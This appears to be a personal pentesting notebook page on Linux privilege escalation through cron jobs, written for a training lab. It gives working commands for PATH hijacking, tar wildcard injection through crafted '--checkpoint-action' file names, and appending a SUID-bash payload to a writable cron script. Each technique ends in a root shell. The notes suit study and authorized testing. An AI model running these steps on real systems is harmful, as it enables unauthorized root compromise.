#### Cron Jobs

The first five fields at the beginning of the cron job entry are used to specify the scheduled time. These fields are used to specify the following values:

Minute (0 – 59): Used to specify the minute the cron job should be run.
Hour (0 – 23): Used to specify the hour of the day the cron job should be run.
Day of the month (1 – 31): Used to specify the specific day of the month the cron job should be run.
Month (1 – 12): Used to specify the month when the cron job should be run.
Day of the week (0 – 7): Used to specify the day of the week when the cron job should be run.

```bash - target
ls -lah /etc/cron*
```

Find and cat out **any** files.

```bash - target
grep "CRON" /var/log/cron.log
```

```bash - target
cat /etc/crontab 
```

Look at ==WHO IS RUNNING== the task, not who owns it!

![[Pasted image 20220324133531.png]]

![[Pasted image 20220324133642.png]]

![[1._Reverse Shells (LIN)#Python file root execute]]

Also check:
```bash - target
systemctl list-timers --all
```

![[Pasted image 20220220161524.png]]

#### Path Environment Variable

The crontab PATH environment variable is by default set to /usr/bin:/bin

The PATH variable can be overwritten in the crontab file.

If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

1. View the contents of the system-wide crontab:

```bash - target
cat /etc/crontab
```

>PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```* * * * * root overwrite.sh```
```* * * * * root /usr/local/bin/compress.sh```

![[Pasted image 20211230154452.png]]

Note that the /home/user directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path.

2. Create the file overwrite.sh in /home/user with the following contents:

[[1.2_Root Shell spawn#Script / cronjob]]


#### File nonexistant
Notice the path that is listed, how it starts with /home/user.  Let's check there to see if the file "overwrite.sh" exists:

```bash - target
ls -lah /home/user
```

It does not, so we can create the file to give us root.

```bash - target
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

```bash - target
chmod +x /home/user/overwrite.sh
```

The cron job runs every minute, so just wait until we see bash in /tmp directory, then run:

```bash - target
/tmp/bash -p
```

![[Pasted image 20220220163029.png]]

#### Wildcards
```bash - target
cat /etc/crontab 
```

In this example, we look at /usr/local/bin/compress.sh

```bash - target
cat /usr/local/bin/compress.sh
```

![[Pasted image 20221115135824.png]]

We can take advantage of the wildcard character as seen above.  We'll create a malicious file called "runme.sh"

```bash - target
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
```

```bash - target
chmod +x runme.sh
```

```bash - target
touch /home/user/--checkpoint=1
```

```bash - target
touch /home/user/--checkpoint-action=exec=sh\runme.sh
```

```bash - target
/tmp/bash -p
```

![[Pasted image 20220220164120.png]]

#### Append malicious code

![[Pasted image 20220220161524.png]]

We run ``'locate overwrite.sh'`` to find the location of the file, or, using the PATH, we begin hunting down the overwrite.sh file.  First we look in /home/user, not there, then /usr/local/sbin, not there, then finally we find it in /usr/local/bin.

```bash - target
ls -lah /usr/local/bin/overwrite.sh
```

We see we do have write privileges to the file.  Let's take a peek at what the file does.

```bash - target
cat /usr/local/bin/overwrite.sh
```

Now, we will append on our malicious code the file:

```bash - target
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

```bash - target
/tmp/bash -p
```

![[Pasted image 20220220165112.png]]


